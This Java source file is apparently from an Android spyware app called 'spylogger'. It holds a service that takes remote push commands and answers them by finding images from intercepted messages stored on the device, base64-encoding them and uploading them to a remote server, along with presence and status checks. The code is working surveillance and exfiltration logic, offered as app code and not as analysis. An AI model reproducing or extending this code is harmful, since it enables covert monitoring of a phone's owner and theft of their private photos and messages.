package com.gravatasufoca.spylogger.services;

import android.content.Context;
import android.util.Log;

import com.gravatasufoca.spylogger.model.Mensagem;
import com.gravatasufoca.spylogger.model.TipoMidia;
import com.gravatasufoca.spylogger.repositorio.RepositorioMensagem;
import com.gravatasufoca.spylogger.repositorio.impl.RepositorioMensagemImpl;
import com.gravatasufoca.spylogger.utils.Utils;
import com.gravatasufoca.spylogger.vos.EnvioArquivoVO;
import com.gravatasufoca.spylogger.vos.FcmMessageVO;

import java.io.File;
import java.sql.SQLException;

/**
 * Created by bruno on 05/01/17.
 */

public class FcmHelperService {
    private Context context;
    private FcmMessageVO fcmMessageVO;
    private SendArquivoService sendArquivoService;
    private EnvioArquivoVO envioArquivoVO;

    public FcmHelperService(Context context, FcmMessageVO fcmMessageVO) {
        this.context = context;
        this.fcmMessageVO = fcmMessageVO;
        sendArquivoService=new SendArquivoService(null);
        envioArquivoVO= new EnvioArquivoVO.EnvioArquivoVOBuilder()
                .setPhpId(fcmMessageVO.getPhpId())
                .setTipoAcao(fcmMessageVO.getTipoAcao())
                .build();
    }

    public void executar() {
        switch (fcmMessageVO.getTipoAcao()) {
            case RECUPERAR_IMAGEM:
                enviarImagem();
                break;
            case ESTA_ATIVO:
                sendArquivoService.enviar(envioArquivoVO);
                break;
            case IMAGEM_EXISTE:
                envioArquivoVO.setExiste(recuperarImagem()!=null);
                sendArquivoService.notificarExistencia(envioArquivoVO);
                break;
            default:
                return;
        }
    }

    private File recuperarImagem(){
        try {
            RepositorioMensagem repositorioMensagem = new RepositorioMensagemImpl(context);
            Mensagem mensagem = repositorioMensagem.obterPorId(fcmMessageVO.getId());

            if (mensagem != null) {
                return Utils.getMediaFile(
                        TipoMidia.IMAGEM,
                        mensagem.getTamanhoArquivo(),
                        mensagem.getDataRecebida(), 2);
            }

        } catch (SQLException e) {
            Log.e(this.getClass().getSimpleName(), e.getMessage());
        }
        return null;
    }

    private void enviarImagem() {
        File file=recuperarImagem();
        if(file!=null){
            envioArquivoVO.setId(fcmMessageVO.getId());
            envioArquivoVO.setArquivo(Utils.encodeBase64(file));

            sendArquivoService.enviar(envioArquivoVO);
        }
    }
}
